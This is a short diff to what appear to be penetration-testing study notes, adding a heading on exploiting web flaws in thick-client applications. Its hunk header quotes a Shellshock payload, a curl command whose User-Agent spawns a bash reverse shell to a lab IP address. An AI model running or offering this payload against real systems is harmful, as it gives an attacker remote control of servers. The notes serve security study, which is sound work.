@@ -538,3 +538,6 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' 
 * Server side attacks
 	* owasp stuff
 * De4Dot can be used to reverse .NET executables
+
+# Exploiting Web Vulnerabilities in Thick-Client Application
+* 
